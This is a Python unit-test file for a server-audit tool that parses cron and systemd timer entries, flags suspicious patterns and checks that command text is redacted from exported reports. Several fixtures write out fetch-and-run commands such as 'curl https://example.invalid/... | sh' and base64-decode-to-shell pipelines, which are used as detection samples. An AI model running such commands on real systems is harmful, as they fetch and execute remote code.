import json
import os
import platform
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from server_audit.collectors import scheduled_tasks as tasks
from server_audit import reporting


class ParsingTests(unittest.TestCase):
    def test_system_and_user_cron_formats_exclude_commands(self):
        text = 'MAILTO=PRIVATE_SENTINEL\n# comment\n*/5 * * JAN MON root curl https://example.invalid/PRIVATE_SENTINEL | sh\n@reboot root /usr/local/start.sh\n'
        jobs, assignments, issues = tasks.parse_crontab(text, True, 'root')
        self.assertEqual(assignments, 1)
        self.assertEqual(len(jobs), 2)
        self.assertEqual(issues, [{'line': 3, 'reason': 'Unsupported command references; raw text withheld'}])
        self.assertIn('download-to-interpreter', jobs[0]['patterns'])
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(jobs))
        jobs, _, _ = tasks.parse_crontab('@daily /usr/local/task.sh', False, 'alice')
        self.assertEqual(jobs[0]['user'], 'alice')

    def test_invalid_cron_does_not_export_arbitrary_text(self):
        jobs, _, issues = tasks.parse_crontab('secret1 secret2 secret3 secret4 secret5 root command', True, 'root')
        self.assertEqual(jobs, [])
        self.assertNotIn('secret', json.dumps(issues))

    def test_obfuscation_and_temporary_paths_are_only_signals(self):
        patterns = tasks.suspicious_patterns('echo payload | base64 -d | sh; eval "$x"; /tmp/task')
        self.assertIn('encoded-payload-decoding', patterns)
        self.assertIn('dynamic-evaluation', patterns)
        self.assertIn('temporary-path-reference', patterns)
        self.assertEqual(tasks.suspicious_patterns('/usr/sbin/logrotate /etc/logrotate.conf'), [])

    def test_script_references_do_not_expand_or_include_inline_code(self):
        self.assertEqual(tasks.script_paths('python3 /srv/task.py --token PRIVATE_SENTINEL'), ['/srv/task.py'])
        self.assertEqual(tasks.script_paths('sh -c "PRIVATE_SENTINEL"'), [])
        self.assertEqual(tasks.script_paths('/usr/local/backup'), ['/usr/local/backup'])
        self.assertEqual(tasks.script_paths('/srv/$VARIABLE/script.sh'), [])

    def test_timer_escaped_paths_are_rejected_before_shell_tokenization(self):
        targets, complete = tasks.timer_script_paths(r'{ path=/srv/my\x20task.sh ; argv[]=/srv/my\x20task.sh ; ignore_errors=no ; }')
        self.assertEqual(targets, [])
        self.assertFalse(complete)

    def test_timer_executable_identity_uses_path_not_custom_argv_zero(self):
        targets, complete = tasks.timer_script_paths('{ path=/usr/bin/python3 ; argv[]=custom-name /srv/task.py ; ignore_errors=no ; }')
        self.assertEqual(targets, ['/usr/bin/python3', '/srv/task.py'])
        self.assertTrue(complete)

    def test_interpreter_named_argument_is_not_a_script_reference(self):
        self.assertEqual(tasks.script_paths('/usr/bin/printf python3 /PRIVATE_SENTINEL'), ['/usr/bin/printf'])
        targets, complete = tasks.timer_script_paths('{ path=/usr/bin/printf ; argv[]=/usr/bin/printf python3 /PRIVATE_SENTINEL ; ignore_errors=no ; }')
        self.assertEqual(targets, ['/usr/bin/printf'])
        self.assertTrue(complete)

    def test_shell_operators_never_become_script_path_suffixes(self):
        cases = (
            ('/usr/bin/true;TOKEN=PRIVATE_SENTINEL', ['/usr/bin/true']),
            ('/usr/bin/true&&curl https://example.invalid/PRIVATE_SENTINEL', ['/usr/bin/true']),
            ('/usr/bin/true>/tmp/PRIVATE_SENTINEL', ['/usr/bin/true']),
            ('python3 /srv/task.py;TOKEN=PRIVATE_SENTINEL', ['/srv/task.py']),
            ('/usr/bin/true | /srv/PRIVATE_SENTINEL', ['/usr/bin/true']),
        )
        for command, expected in cases:
            with self.subTest(command=command):
                paths, complete = tasks.script_references(command)
                self.assertEqual(paths, expected)
                self.assertFalse(complete)
                self.assertNotIn('PRIVATE_SENTINEL', json.dumps(paths))

    def test_quoted_and_escaped_literal_paths_preserve_metacharacters(self):
        cases = (
            ('"/srv/task;version=1.sh"', ['/srv/task;version=1.sh']),
            (r'/srv/task\&job.sh', ['/srv/task&job.sh']),
            ('python3 "/srv/my task.py"', ['/srv/my task.py']),
            ('/usr/bin/printf ";"', ['/usr/bin/printf']),
        )
        for command, expected in cases:
            with self.subTest(command=command):
                self.assertEqual(tasks.script_references(command), (expected, True))

    def test_cron_stdin_boundary_is_quote_independent_and_respects_escapes(self):
        for command, expected in (
            ('/srv/job.sh%PRIVATE_SENTINEL', '/srv/job.sh'),
            ('"/srv/job.sh%PRIVATE_SENTINEL"', '"/srv/job.sh'),
            (r'/srv/job\%1.sh', '/srv/job%1.sh'),
            (r'/srv/job\\%PRIVATE_SENTINEL', '/srv/job\\\\'),
            (r'/srv/job\\\%1.sh', '/srv/job\\\\%1.sh'),
        ):
            with self.subTest(command=command):
                self.assertEqual(tasks.cron_command(command), expected)
        jobs, _, issues = tasks.parse_crontab('* * * * * root /srv/job.sh%PRIVATE_SENTINEL', True, 'root')
        self.assertEqual(jobs[0]['referenced_scripts'], ['/srv/job.sh'])
        self.assertEqual(issues, [])
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(jobs))

    def test_invalid_quotes_and_dynamic_references_have_redacted_parse_issues(self):
        for command in ('"/srv/PRIVATE_SENTINEL', '/srv/$PRIVATE_SENTINEL/job', 'TOKEN=PRIVATE_SENTINEL /srv/job',
                        '/usr/bin/true\x00TOKEN=PRIVATE_SENTINEL'):
            with self.subTest(command=command):
                jobs, _, issues = tasks.parse_crontab('* * * * * root ' + command, True, 'root')
                self.assertEqual(jobs[0]['referenced_scripts'], [])
                self.assertTrue(issues)
                self.assertNotIn('PRIVATE_SENTINEL', json.dumps([jobs, issues]))

    def test_timer_literal_argv_does_not_use_cron_or_shell_syntax(self):
        value = '{ path=/srv/task%1;version=2.sh ; argv[]="/srv/task%1;version=2.sh" ; ignore_errors=no ; }'
        self.assertEqual(tasks.timer_script_paths(value), (['/srv/task%1;version=2.sh'], True))


@unittest.skipUnless(platform.system() == 'Linux', 'Linux cron filesystem inspection')
class CollectorTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)
        self.cron = self.root / 'crontab'

    def collect(self, run, directories=()):
        with patch.object(tasks, 'CRON_FILE', self.cron), patch.object(tasks, 'CRON_DIRECTORIES', directories):
            return tasks.collect(run)

    def test_files_and_timer_execstart_are_redacted_and_never_executed(self):
        script = self.root / 'task.sh'
        script.write_text('#!/bin/sh\necho PRIVATE_SENTINEL | base64 -d | sh\n')
        script.chmod(0o777)
        self.cron.write_text('0 * * * * root ' + str(script) + '\n')
        calls = []
        def run(command):
            calls.append(command)
            self.assertEqual(command[0], 'systemctl')
            if 'list-units' in command:
                output = 'example.timer loaded active waiting Example'
            elif command[-1] == 'example.timer':
                output = 'Unit=example.service\nActiveState=active\nLastTriggerUSec=Thu 2026-09-17 00:00:00 UTC'
            else:
                output = 'User=root\nExecStart={ path=/bin/sh ; argv[]=/bin/sh -c curl https://example.invalid/PRIVATE_SENTINEL | sh ; }'
            return {'status': 'ok', 'output': output}
        report, findings = self.collect(run)
        self.assertEqual(len(report['cron_files']), 1)
        self.assertEqual(len(report['timers']), 1)
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(report))
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(findings))
        self.assertTrue(any('group/world-writable' in item['message'] for item in findings))
        self.assertTrue(any('not a malware verdict' in item['message'] for item in findings))

    def test_command_fragments_are_absent_from_all_export_formats(self):
        self.cron.write_text('* * * * * root /usr/bin/true;TOKEN=PRIVATE_SENTINEL\n'
                             '* * * * * root /usr/bin/true%PRIVATE_SENTINEL\n')
        check, findings = self.collect(lambda command: {'status': 'ok', 'output': ''})
        self.assertEqual(check['status'], 'partial')
        self.assertTrue(any(item['level'] == 'UNKNOWN' for item in findings))
        jobs = check['cron_files'][0]['jobs']
        self.assertEqual([job['referenced_scripts'] for job in jobs], [['/usr/bin/true'], ['/usr/bin/true']])
        report = {'schema_version': 1, 'host': 'fixture', 'timestamp_utc': '2026-01-01T12:00:00+00:00',
                  'checks': {'scheduled_tasks': check}, 'findings': findings,
                  'summary': {level: sum(item['level'] == level for item in findings) for level in ('REVIEW', 'UNKNOWN')},
                  'limitations': []}
        bundle = reporting.export_report(report, self.root / 'exports')
        for output in ((bundle / 'report.html').read_text(),
                       (bundle / 'data' / 'report.json').read_text(), reporting.render_text(report)):
            self.assertNotIn('PRIVATE_SENTINEL', output)

    def test_missing_and_regular_primary_crontabs_remain_distinct(self):
        run = lambda command: {'status': 'ok', 'output': ''}
        check, findings = self.collect(run)
        self.assertEqual(check['status'], 'ok')
        self.assertEqual(check['cron_files'], [])
        self.assertEqual(findings, [])
        self.cron.write_text('* * * * * root true\n')
        check, findings = self.collect(run)
        self.assertEqual(check['status'], 'ok')
        self.assertEqual(len(check['cron_files']), 1)
        self.assertEqual(check['issues'], [])

    def test_valid_and_dangling_primary_crontab_links_are_unknown(self):
        target = self.root / 'target'
        self.cron.symlink_to(target)
        for present in (False, True):
            with self.subTest(target_exists=present):
                if present:
                    target.write_text('PRIVATE_SENTINEL')
                check, findings = self.collect(lambda command: {'status': 'ok', 'output': ''})
                self.assertEqual(check['status'], 'partial')
                self.assertEqual(check['cron_files'], [])
                self.assertTrue(check['issues'])
                self.assertEqual(sum(item['level'] == 'UNKNOWN' for item in findings), 1)
                self.assertNotIn('PRIVATE_SENTINEL', json.dumps([check, findings]))

    def test_primary_crontab_metadata_failure_preserves_other_cron_and_timer_evidence(self):
        other = self.root / 'cron.d'
        other.mkdir()
        (other / 'other').write_text('* * * * * root true\n')
        original = Path.lstat
        def metadata(path):
            if path == self.cron:
                raise PermissionError('PRIVATE_SENTINEL')
            return original(path)
        with patch.object(Path, 'lstat', metadata):
            check, findings = self.collect(lambda command: {'status': 'ok', 'output': ''}, ((str(other), 'system'),))
        self.assertEqual(check['status'], 'partial')
        self.assertEqual(check['timer_collection_status'], 'ok')
        self.assertEqual(len(check['cron_files']), 1)
        self.assertTrue(any('metadata unavailable' in issue['reason'] for issue in check['issues']))
        self.assertTrue(any(item['level'] == 'UNKNOWN' for item in findings))
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps([check, findings]))

    def test_periodic_script_permissions_and_patterns_share_one_resource(self):
        daily = self.root / 'cron.daily'
        daily.mkdir()
        script = daily / 'job'
        script.write_text('#!/bin/sh\ncurl https://example.invalid/demo\n')
        script.chmod(0o777)
        check, findings = self.collect(lambda command: {'status': 'ok', 'output': ''}, ((str(daily), 'periodic'),))
        related = [item for item in findings if item.get('resource_id') == str(script)]
        self.assertTrue(any('writable' in item['message'] for item in related))
        self.assertTrue(any('suspicious patterns' in item['message'] for item in related))
        self.assertEqual({(item['check'], item['resource_type'], item['resource_id']) for item in related},
                         {('scheduled_tasks', 'script', str(script))})
        self.assertEqual(check['cron_files'][0]['kind'], 'periodic')

    def test_links_fifos_and_oversized_files_are_unknown(self):
        secret = self.root / 'secret'
        secret.write_text('PRIVATE_SENTINEL')
        self.cron.symlink_to(secret)
        with self.assertRaises(ValueError):
            tasks.read_definition(self.cron)
        fifo = self.root / 'fifo'
        os.mkfifo(fifo)
        with self.assertRaises(ValueError):
            tasks.read_definition(fifo)
        with patch.object(tasks, 'MAX_BYTES', 3), self.assertRaises(ValueError):
            tasks.read_definition(secret)

    def test_binary_executables_receive_metadata_not_pattern_scanning(self):
        binary = self.root / 'executable'
        binary.write_bytes(b'\x7fELF\x00base64 -d\x00' + b'A' * (tasks.MAX_BYTES + 10))
        content, metadata = tasks.read_definition(binary, script=True)
        self.assertEqual(content, '')
        self.assertEqual(metadata['content_status'], 'binary_metadata_only')

    def test_unavailable_timers_and_parse_failures_are_partial(self):
        self.cron.write_text('invalid cron line PRIVATE_SENTINEL\n')
        report, findings = self.collect(lambda command: {'status': 'error', 'detail': 'PRIVATE_SENTINEL'})
        self.assertEqual(report['status'], 'partial')
        self.assertEqual(report['timer_collection_status'], 'error')
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(report))
        self.assertTrue(any(item['level'] == 'UNKNOWN' for item in findings))

    def test_file_limit_is_explicit(self):
        self.cron.write_text('* * * * * root true\n')
        with patch.object(tasks, 'MAX_FILES', 0):
            report, findings = self.collect(lambda command: {'status': 'ok', 'output': ''})
        self.assertEqual(report['status'], 'partial')
        self.assertTrue(report['issues'])

    def test_shared_script_checks_each_run_as_owner_once(self):
        from types import SimpleNamespace
        script = self.root / 'shared.sh'
        script.write_text('echo safe\n')
        self.cron.write_text(f'0 * * * * alice {script}\n0 * * * * root {script}\n0 * * * * root {script}\n')
        original = tasks.read_definition
        def read(path, script=False):
            content, metadata = original(path, script)
            # Model both owners; the temporary crontab need not be root-owned.
            metadata['uid'] = 1001 if path.name == 'shared.sh' else 0
            return content, metadata
        with patch.object(tasks, 'read_definition', side_effect=read) as reader, patch('pwd.getpwnam', side_effect=lambda name: SimpleNamespace(pw_uid=1001 if name == 'alice' else 0)):
            report, findings = self.collect(lambda command: {'status': 'ok', 'output': ''})
        owners = [item for item in findings if 'unexpected owner' in item['message']]
        self.assertEqual(len(owners), 1)
        self.assertIn('run-as UID 0', owners[0]['message'])
        self.assertEqual(len(report['referenced_files']), 1)
        self.assertEqual(reader.call_count, 2)

    def test_timer_target_body_is_inspected_without_export(self):
        script = self.root / 'timer.sh'
        script.write_text('echo PRIVATE_SENTINEL | base64 -d\n')
        def run(command):
            if 'list-units' in command:
                output = 'example.timer loaded active waiting Example'
            elif command[-1] == 'example.timer':
                output = 'Unit=example.service'
            else:
                output = f'User=root\nExecStart={{ path={script} ; argv[]={script} ; ignore_errors=no ; start_time=[n/a] ; }}'
            return {'status': 'ok', 'output': output}
        report, findings = self.collect(run)
        self.assertEqual(report['timers'][0]['referenced_scripts'], [str(script)])
        self.assertIn('encoded-payload-decoding', report['referenced_files'][0]['patterns'])
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps([report, findings]))

    def test_unsupported_timer_command_marks_coverage_unknown(self):
        def run(command):
            output = ('example.timer loaded active waiting Example' if 'list-units' in command else
                      'Unit=example.service' if command[-1] == 'example.timer' else
                      'User=root\nExecStart=UNSUPPORTED_PRIVATE_SENTINEL')
            return {'status': 'ok', 'output': output}
        report, findings = self.collect(run)
        self.assertEqual(report['status'], 'partial')
        self.assertEqual(report['timers'][0]['status'], 'unknown')
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps([report, findings]))


if __name__ == '__main__':
    unittest.main()
